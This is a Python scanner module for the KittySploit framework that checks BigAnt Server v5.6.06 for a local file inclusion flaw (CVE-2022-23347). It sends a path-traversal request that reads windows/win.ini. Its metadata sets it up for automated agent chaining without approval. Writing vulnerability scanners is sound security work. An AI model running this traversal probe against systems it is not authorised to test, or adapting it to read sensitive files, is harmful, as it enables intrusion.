#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""BigAnt Server v5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'BigAnt Server v5.6.06 - Local File Inclusion Detection',
        'description': 'BigAnt Server v5.6.06 is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'bigant', 'lfi', 'bigantsoft', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/bzyo/cve-pocs/tree/master/CVE-2022-23347',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-23347',
            'http://bigant.com',
            'https://www.bigantsoft.com/',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-23347',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="BigAnt Server v5.6.06 - Local File Inclusion detected",
                path='/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini&file_name=win.ini',
            )
            return True
        return False

